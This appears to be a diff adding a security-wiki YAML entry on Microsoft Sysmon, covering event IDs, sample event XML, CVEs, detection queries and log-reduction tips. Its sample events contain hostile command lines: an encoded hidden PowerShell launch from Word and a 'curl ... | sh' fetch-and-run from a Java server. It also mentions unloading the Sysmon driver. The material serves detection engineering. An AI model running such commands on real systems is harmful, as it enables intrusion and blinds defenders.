@@ -1,0 +1,375 @@
+# Secpedia entry — see CONTRIBUTING.md and schema/entry.schema.json
+id: sysmon
+name: Microsoft Sysmon (Windows & Linux)
+short: Sysmon
+aka:
+  - System Monitor
+  - Sysinternals Sysmon
+  - Sysmon for Linux
+  - Microsoft-Windows-Sysmon/Operational
+vendor: Microsoft
+category: os
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - sysinternals
+  - windows
+  - linux
+  - ebpf
+  - event log
+  - xml
+  - process
+  - free
+summary: Free Sysinternals service + kernel driver that logs high-fidelity endpoint telemetry — process creation with full command line and hashes, network connections, image/driver loads, process access, file, registry, WMI, named-pipe and DNS events — to the Windows event log (Microsoft-Windows-Sysmon/Operational) or, on Linux via eBPF, to syslog. It detects nothing on its own; its value depends entirely on the XML configuration that decides what is logged.
+sourcetypes:
+  - st: windows_sysmon
+    desc: Sysmon for Windows events (Microsoft-Windows-Sysmon/Operational), Windows event XML
+  - st: sysmon_linux
+    desc: Sysmon for Linux events — the same XML event schema written to syslog (Linux-Sysmon/Operational)
+  - st: XmlWinEventLog
+    desc: Splunk Add-on for Sysmon sourcetype (XML or standard rendering); the source is XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+  - st: sysmon:linux
+    desc: Splunk Add-on for Sysmon for Linux
+facts:
+  First released: 2014 (Sysmon v1, Mark Russinovich / Thomas Garnier); Sysmon for Linux 2021
+  Platform: Windows 10/11 and Server (x64, ARM64); Linux (eBPF, kernel 4.15+ / distro packages)
+  Delivery model: Free standalone binary (sysmon64.exe) + boot-start driver; open-source Linux port on GitHub
+  Configuration: XML rule file (schema 4.x) with include/exclude filters per event ID; community baselines (SwiftOnSecurity, Olaf Hartong sysmon-modular)
+  Log transport: Windows Event Log → WEF/WEC, Splunk UF, Cribl Edge, AMA/Sentinel, Winlogbeat; Linux → syslog / journald
+  Log format: Windows event XML (EventData Name/value pairs); Linux writes the same XML into syslog messages
+  Event IDs: 1–29 + 255 (process, network, driver/image load, process access, file, registry, WMI, pipe, DNS, file delete/block, tampering)
+  Typical volume: 2–50 MB per host per day with a tuned config; many times more with a permissive one (Event 3, 7, 10, 22 dominate)
+  Cribl Pack: Cribl Splunk Forwarder Windows Sysmon/XML Events to JSON (Packs Dispensary)
+placement:
+  slots:
+    - endpoint
+    - internal
+  items:
+    - slot: endpoint
+      title: Workstations and servers
+      desc: Installed with sysmon64 -i config.xml (often via GPO, Intune or SCCM). The driver starts at boot and the service writes events to the Sysmon/Operational channel. Protected process — hard to kill from user mode.
+    - slot: internal
+      title: Domain controllers and critical servers
+      desc: Process, network and LSASS-access telemetry on DCs, jump hosts and file servers is the classic gap Sysmon fills where a commercial EDR is not deployed.
+    - slot: internal
+      title: Windows Event Collector / forwarding tier
+      desc: Events reach the SIEM through WEF to a collector, the Splunk UF, Cribl Edge or the Azure Monitor Agent; Linux Sysmon goes through rsyslog / syslog-ng.
+    - slot: endpoint
+      title: Linux servers
+      desc: Sysmon for Linux uses eBPF (SysinternalsEBPF) to capture process, network, file and raw-access events with the same event IDs and XML schema.
+howItWorks:
+  - title: Driver + service
+    body: A kernel driver (boot-start) captures process, image-load, network, file, registry and raw-disk activity; the Sysmon service applies the configuration filters and writes matching events to the Microsoft-Windows-Sysmon/Operational event log. On Linux an eBPF program does the capture and events go to syslog.
+  - title: Configuration is the product
+    body: "An XML file (schemaversion 4.x) lists, per event type, include/exclude rules on fields (Image, CommandLine, TargetFilename, DestinationIp …) with conditions such as is, contains, end with, image. RuleName tags let you name matches (e.g. technique_id=T1059.001). An untuned config either drowns the SIEM or misses everything."
+  - title: ProcessGuid and LogonGuid
+    body: Every process event carries a ProcessGuid that stays unique even when Windows reuses PIDs, and a LogonGuid for the session. Join network (3), image load (7), file (11), registry (12–14) and DNS (22) events to Event 1 on ProcessGuid to rebuild the process tree.
+  - title: Hashes and signatures
+    body: "Events 1, 6, 7 and 15 include Hashes (SHA1 default; MD5, SHA256, IMPHASH configurable) and signature status for drivers and DLLs — useful for allow-listing and threat-intel matching."
+  - title: Protective events (v14+)
+    body: FileBlockExecutable (27), FileBlockShredding (28) and FileExecutableDetected (29) let Sysmon block executables being written to configured paths and log tamper-style actions (25 ProcessTampering). Event 4 (service state) and 16 (config change) reveal attempts to stop or reconfigure Sysmon.
+traffic:
+  handles:
+    - Process creation / termination with command line, hashes, parent (1, 5)
+    - Network connections per process (3)
+    - Driver and DLL loads with signature (6, 7)
+    - Process access e.g. LSASS handle opens (10), remote threads (8)
+    - File create, stream hash, delete and block (11, 15, 23, 26–29)
+    - Registry create/set/rename (12–14)
+    - WMI persistence, named pipes, DNS queries (17–22)
+  flow:
+    - step: Kernel capture
+      desc: Driver (Windows) or eBPF (Linux) sees a process, network, file or registry operation.
+    - step: Config filter
+      desc: Service evaluates the include/exclude rules for that event ID; non-matching events are discarded.
+    - step: Event log write
+      desc: Matching event is written as XML to Microsoft-Windows-Sysmon/Operational (or syslog on Linux).
+    - step: Forward
+      desc: WEF, Splunk UF, Cribl Edge, AMA or syslog agent ships the event off the host.
+    - step: Parse and reduce
+      desc: Cribl Stream parses the XML (C.Text.parseWinEvent), drops empty/default values, converts to JSON or KV.
+    - step: Correlate
+      desc: SIEM joins events on ProcessGuid / Computer and runs detections (Sigma rules are written largely against Sysmon).
+logs:
+  - type: Event 1 — Process creation
+    sourcetype: windows_sysmon
+    format: xml
+    share: 10–25 %
+    avg: ~2 KB
+    desc: Every process start that passes the config — image, full command line, user, integrity level, hashes and the parent process. The single most used endpoint log in detection engineering.
+    key:
+      - EventID
+      - Computer
+      - Image
+      - CommandLine
+      - User
+      - ParentImage
+      - Hashes
+      - ProcessGuid
+    noise:
+      - Keywords
+      - Opcode
+      - Task
+      - Version
+      - FileVersion
+      - Product
+      - Company
+      - TerminalSessionId
+    sample: |-
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2026-11-12T09:14:20.1105432Z"/><EventRecordID>482113</EventRecordID><Correlation/><Execution ProcessID="3204" ThreadID="4412"/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ws-fin-042.corp.example.com</Computer><Security UserID="S-1-5-18"/></System><EventData><Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data><Data Name="UtcTime">2026-11-12 09:14:20.108</Data><Data Name="ProcessGuid">{8f2b1c0d-9e7a-6735-5c04-000000001b00}</Data><Data Name="ProcessId">7412</Data><Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name="FileVersion">10.0.22621.3672 (WinBuild.160101.0800)</Data><Data Name="Description">Windows PowerShell</Data><Data Name="Product">Microsoft® Windows® Operating System</Data><Data Name="Company">Microsoft Corporation</Data><Data Name="OriginalFileName">PowerShell.EXE</Data><Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=</Data><Data Name="CurrentDirectory">C:\Users\jdoe\Documents\</Data><Data Name="User">CORP\jdoe</Data><Data Name="LogonGuid">{8f2b1c0d-1a2b-6735-3b8c-280000000000}</Data><Data Name="LogonId">0x28B3C3B</Data><Data Name="TerminalSessionId">2</Data><Data Name="IntegrityLevel">Medium</Data><Data Name="Hashes">SHA256=0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF,IMPHASH=00112233445566778899AABBCCDDEEFF</Data><Data Name="ParentProcessGuid">{8f2b1c0d-9e70-6735-4a04-000000001b00}</Data><Data Name="ParentProcessId">6120</Data><Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data><Data Name="ParentCommandLine">WINWORD.EXE /n C:\Users\jdoe\Downloads\invoice.docm</Data><Data Name="ParentUser">CORP\jdoe</Data></EventData></Event>
+  - type: Event 3 — Network connection
+    sourcetype: windows_sysmon
+    format: xml
+    share: 20–40 %
+    avg: ~1.6 KB
+    desc: TCP/UDP connection by a process (logged once per new connection, not per packet). Usually the largest Sysmon event type — filter browsers and well-known services in the config.
+    key:
+      - EventID
+      - Computer
+      - Image
+      - User
+      - DestinationIp
+      - DestinationPort
+      - DestinationHostname
+      - Initiated
+    noise:
+      - Keywords
+      - Opcode
+      - Task
+      - SourceIsIpv6
+      - DestinationIsIpv6
+      - SourcePortName
+    sample: |-
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2026-11-12T09:14:24.2210000Z"/><EventRecordID>482131</EventRecordID><Correlation/><Execution ProcessID="3204" ThreadID="5120"/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ws-fin-042.corp.example.com</Computer><Security UserID="S-1-5-18"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2026-11-12 09:14:23.881</Data><Data Name="ProcessGuid">{8f2b1c0d-9e7a-6735-5c04-000000001b00}</Data><Data Name="ProcessId">7412</Data><Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name="User">CORP\jdoe</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.20.30.44</Data><Data Name="SourceHostname">ws-fin-042.corp.example.com</Data><Data Name="SourcePort">51544</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">198.51.100.77</Data><Data Name="DestinationHostname">cdn.update-check.example.org</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationPortName">https</Data></EventData></Event>
+  - type: Event 22 — DNS query
+    sourcetype: XmlWinEventLog
+    format: xml
+    share: 15–35 %
+    avg: ~1.3 KB
+    desc: A DNS query made through the Windows DNS client API, attributed to the requesting process, with the answers. Very noisy without excludes for browsers, Windows Update and telemetry domains.
+    key:
+      - EventID
+      - Computer
+      - Image
+      - QueryName
+      - QueryStatus
+      - QueryResults
+    noise:
+      - Keywords
+      - Opcode
+      - Task
+      - RuleName
+    sample: |-
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2026-11-12T09:14:23.1020000Z"/><EventRecordID>482127</EventRecordID><Correlation/><Execution ProcessID="3204" ThreadID="5120"/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ws-fin-042.corp.example.com</Computer><Security UserID="S-1-5-18"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2026-11-12 09:14:22.977</Data><Data Name="ProcessGuid">{8f2b1c0d-9e7a-6735-5c04-000000001b00}</Data><Data Name="ProcessId">7412</Data><Data Name="QueryName">cdn.update-check.example.org</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">::ffff:198.51.100.77;</Data><Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name="User">CORP\jdoe</Data></EventData></Event>
+  - type: Event 1 — Process creation (Sysmon for Linux)
+    sourcetype: sysmon_linux
+    format: xml
+    share: 30–60 % of Linux Sysmon
+    avg: ~1.5 KB
+    desc: Linux process exec with command line, user, current directory and parent — the same schema as Windows, minus hashes and PE metadata ("-"). Arrives inside a syslog line; strip the syslog header before parsing.
+    key:
+      - EventID
+      - Computer
+      - Image
+      - CommandLine
+      - User
+      - ParentImage
+      - ParentCommandLine
+      - CurrentDirectory
+    noise:
+      - Keywords
+      - Opcode
+      - Task
+      - FileVersion
+      - Description
+      - Product
+      - Company
+      - OriginalFileName
+      - Hashes
+    sample: |-
+      <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2026-11-12T09:20:11.749450000Z"/><EventRecordID>104857</EventRecordID><Correlation/><Execution ProcessID="1465" ThreadID="1465"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-01</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2026-11-12 09:20:11.757</Data><Data Name="ProcessGuid">{a1b2c3d4-0001-0000-0000-000000000001}</Data><Data Name="ProcessId">10268</Data><Data Name="Image">/usr/bin/bash</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">bash -c curl -s http://203.0.113.50/x.sh | sh</Data><Data Name="CurrentDirectory">/opt/app</Data><Data Name="User">tomcat</Data><Data Name="LogonGuid">{a1b2c3d4-0000-0000-0000-000000000000}</Data><Data Name="LogonId">1001</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{a1b2c3d4-0002-0000-0000-000000000002}</Data><Data Name="ParentProcessId">15369</Data><Data Name="ParentImage">/usr/lib/jvm/java-17-openjdk/bin/java</Data><Data Name="ParentCommandLine">java -jar /opt/app/app.jar</Data><Data Name="ParentUser">tomcat</Data></EventData></Event>
+cves:
+  - id: CVE-2023-29343
+    cvss: 7.8
+    year: 2023
+    kev: false
+    scope: device
+    title: Sysmon for Windows elevation of privilege (CNA score)
+    affected: Sysmon for Windows before 14.16
+    fixed: "14.16"
+    detect: Sysmon Event 4 / 16 (service state, config change) from unexpected accounts; inventory showing Sysmon versions below 14.16; file events under C:\Windows\Sysmon* or the archive directory by non-SYSTEM processes.
+    avoid: Upgrade Sysmon (deploy via GPO/Intune with version checks); restrict the ArchiveDirectory ACLs.
+  - id: CVE-2022-44704
+    cvss: 7.8
+    year: 2022
+    kev: false
+    scope: device
+    title: Sysmon for Windows elevation of privilege
+    affected: Sysmon for Windows before 14.13
+    fixed: "14.13"
+    detect: Same as above — version inventory below 14.13; unexpected Event 16 configuration changes.
+    avoid: Upgrade Sysmon; monitor the Sysmon service and driver state.
+  - id: CVE-2022-41120
+    cvss: 7.8
+    year: 2022
+    kev: false
+    scope: device
+    title: Sysmon for Windows elevation of privilege via the archive/delete feature (CNA score)
+    affected: Sysmon for Windows before 14.11
+    fixed: "14.11"
+    detect: Event 23/26 (file delete) activity on Sysmon's own archive directory by a low-privilege user; version below 14.11.
+    avoid: Upgrade; do not grant users write access to the configured ArchiveDirectory.
+  - id: CVE-2021-44228
+    cvss: 10
+    year: 2021
+    kev: true
+    scope: traffic
+    title: Apache Log4j "Log4Shell" JNDI RCE — the canonical case of a server process spawning a shell, which Sysmon Event 1 records
+    affected: Apache Log4j 2.0-beta9 – 2.15.0 (excluding 2.12.2, 2.12.3, 2.3.1)
+    fixed: Log4j 2.17.1 (2.12.4 for Java 7, 2.3.2 for Java 6)
+    detect: Event 1 with ParentImage java / java.exe / tomcat and Image sh, bash, cmd.exe, powershell.exe; Event 3 from the Java process to an external LDAP/RMI port (389, 1389, 1099); Event 22 for unusual domains from java.
+    avoid: Patch Log4j; block outbound LDAP/RMI from servers; alert on interpreters spawned by Java services.
+  - id: CVE-2021-36934
+    cvss: 7.8
+    year: 2021
+    kev: true
+    scope: traffic
+    title: Windows "HiveNightmare / SeriousSAM" — readable SAM/SYSTEM hives via shadow copies
+    affected: Windows 10 1809+ and Windows 11 before the August 2021 update (and until shadow copies are recreated)
+    fixed: Microsoft August 2021 security updates + deleting existing shadow copies
+    detect: Event 1 / 11 for non-admin processes reading or copying \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*\Windows\System32\config\SAM; Event 1 for vssadmin / wmic shadowcopy enumeration by users.
+    avoid: Patch; fix ACLs (icacls %windir%\system32\config\*.* /inheritance:e); delete old shadow copies.
+detections:
+  - title: Office or browser spawning a script interpreter
+    severity: high
+    signals:
+      - EventID=1
+      - ParentImage ends WINWORD.EXE / EXCEL.EXE / OUTLOOK.EXE
+      - Image ends powershell.exe / cmd.exe / mshta.exe / wscript.exe
+    why: Classic macro / exploit initial-access chain. Sysmon is what makes this visible on hosts without a commercial EDR.
+    kql: |-
+      dataset="sysmon" EventID="1"
+      | where ParentImage matches regex @"(?i)\\(winword|excel|powerpnt|outlook)\.exe$"
+      | where Image matches regex @"(?i)\\(powershell|pwsh|cmd|mshta|wscript|cscript|rundll32)\.exe$"
+      | summarize count(), cmds=make_set(CommandLine, 5) by Computer, User, ParentImage, Image
+    mitre:
+      - T1566.001
+      - T1204.002
+      - T1059.001
+  - title: LSASS memory access (credential dumping)
+    severity: critical
+    signals:
+      - EventID=10
+      - TargetImage ends lsass.exe
+      - GrantedAccess 0x1010 / 0x1410 / 0x1FFFFF from an unusual SourceImage
+    why: Mimikatz, procdump and comsvcs MiniDump all open LSASS with read access. Requires an Event 10 rule for lsass.exe in the config.
+    kql: |-
+      dataset="sysmon" EventID="10"
+      | where TargetImage endswith "\\lsass.exe" and GrantedAccess in ("0x1010","0x1410","0x1438","0x143a","0x1fffff")
+      | where not(SourceImage has_any ("\\MsMpEng.exe","\\csrss.exe","\\wininit.exe"))
+      | summarize count() by Computer, SourceImage, GrantedAccess
+    mitre:
+      - T1003.001
+  - title: Java / web server spawning a shell (Log4Shell-style)
+    severity: critical
+    signals:
+      - EventID=1 (Windows or Linux)
+      - ParentImage java / tomcat / w3wp / httpd
+      - Image sh / bash / cmd.exe / powershell.exe
+    why: Web and application servers almost never start interactive shells; this catches exploitation of public-facing apps regardless of the CVE.
+    kql: |-
+      dataset="sysmon" EventID="1"
+      | where ParentImage matches regex @"(?i)(/java|\\java\.exe|tomcat|\\w3wp\.exe|/httpd|/nginx)$"
+      | where Image matches regex @"(?i)(/sh|/bash|/dash|\\cmd\.exe|\\powershell\.exe)$"
+      | summarize count(), cmds=make_set(CommandLine, 5) by Computer, User, ParentImage
+    mitre:
+      - T1190
+      - T1059.004
+      - T1505.003
+  - title: Script host connecting to the internet
+    severity: medium
+    signals:
+      - EventID=3
+      - Image powershell / mshta / rundll32 / regsvr32
+      - DestinationIp public
+    why: Download cradles and LOLBin proxies (rundll32, regsvr32) reaching the internet are a strong early indicator.
+    kql: |-
+      dataset="sysmon" EventID="3" Initiated="true"
+      | where Image matches regex @"(?i)\\(powershell|pwsh|mshta|rundll32|regsvr32|certutil|bitsadmin)\.exe$"
+      | where not(ipv4_is_private(DestinationIp))
+      | summarize conns=count(), hosts=make_set(DestinationHostname, 10) by Computer, Image, DestinationIp, DestinationPort
+    mitre:
+      - T1105
+      - T1218.011
+      - T1071.001
+  - title: Sysmon stopped or reconfigured
+    severity: high
+    signals:
+      - EventID=4 (State=Stopped)
+      - EventID=16 (config change) outside a deployment window
+      - Event log cleared / no Sysmon events from a live host
+    why: Attackers unload the driver (fltmc unload SysmonDrv) or push an empty config to blind defenders.
+    kql: |-
+      dataset="sysmon" EventID in ("4","16","255")
+      | summarize count(), first=min(_time) by Computer, EventID
+    mitre:
+      - T1562.001
+      - T1562.006
+optimizations:
+  - title: Parse XML to compact JSON / KV
+    saving: 35–70 %
+    fn: Eval (C.Text.parseWinEvent) → Serialize
+    how: Windows event XML is mostly markup. Parse with C.Text.parseWinEvent(_raw, ['0x0','0','-']) to drop default values, flatten EventData, then serialise as JSON or KV.
+    expr: "__e = C.Text.parseWinEvent(_raw, ['0x0','0','-'])"
+  - title: Strip System block noise
+    saving: 10–20 %
+    fn: Eval (remove fields)
+    how: Keywords (0x8000000000000000), Opcode, Task, Version, Level, Provider Guid, Execution ProcessID/ThreadID (Sysmon's own PID) and Security UserID are constant for Sysmon and can go.
+    expr: "remove: Keywords, Opcode, Task, Version, Level, Provider.Guid, Execution.*, Security.UserID"
+  - title: Drop noisy image loads and DNS
+    saving: 20–40 %
+    fn: Drop + Lookup
+    how: If the config is permissive, drop Event 7 for signed Microsoft DLLs, Event 22 for top domains, and Event 3 for browsers to 443 in Stream rather than waiting for a config rollout.
+    expr: (EventID==7 && Signed=='true' && /Microsoft/.test(Signature)) || (EventID==22 && C.Lookup('top_domains.csv','domain').match(QueryName))
+  - title: Remove PE metadata on Linux and from repeat processes
+    saving: 5–15 %
+    fn: Eval
+    how: Linux Event 1 sets FileVersion/Description/Product/Company/OriginalFileName/Hashes to "-". On Windows, PE metadata can be re-derived from the hash — keep Hashes and OriginalFileName only.
+    expr: "remove: FileVersion, Description, Product, Company when value=='-'"
+  - title: Route by event ID
+    saving: SIEM licence
+    fn: Routes
+    how: 1, 8, 10, 11 (executables), 13 (Run keys), 19–21 (WMI), 25, 27–29 → SIEM at full fidelity. 3, 7, 22 → Cribl Lake raw + SIEM aggregated.
+    expr: "EventID in (3,7,22) → Lake + SIEM(optimised)  |  else → SIEM"
+references:
+  - title: Microsoft Sysinternals — Sysmon (event IDs, configuration schema)
+    url: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
+  - title: Sysmon for Linux (GitHub)
+    url: https://github.com/microsoft/SysmonForLinux
+  - title: Cribl Docs — Reducing Windows XML events
+    url: https://docs.cribl.io/stream/usecase-win-xml/
+  - title: Cribl Pack — Splunk Forwarder Windows Sysmon/XML Events to JSON
+    url: https://github.com/criblpacks/cribl-splunk-forwarder-windows-xml-events-to-json
+  - title: MSRC — CVE-2023-29343 (Sysmon EoP)
+    url: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29343
+  - title: NVD — CVE-2022-44704
+    url: https://nvd.nist.gov/vuln/detail/CVE-2022-44704
+  - title: CISA Known Exploited Vulnerabilities catalog
+    url: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+  - title: MITRE ATT&CK — T1003.001 LSASS Memory
+    url: https://attack.mitre.org/techniques/T1003/001/
+  - title: Splunk Add-on for Sysmon — Source types
+    url: https://splunk.github.io/splunk-add-on-for-microsoft-sysmon/Sourcetypes/
+  - title: Splunk Add-on for Sysmon — Configure inputs
+    url: https://splunk.github.io/splunk-add-on-for-microsoft-sysmon/Configureinputs/
+  - title: Splunk Add-on for Sysmon for Linux — Source types
+    url: https://docs.splunk.com/Documentation/AddOns/released/NixSysmon/Sourcetypes
+related:
+  - win-security
+  - windows-powershell
+  - mde
+  - crowdstrike
+  - linux-auditd
+  - osquery
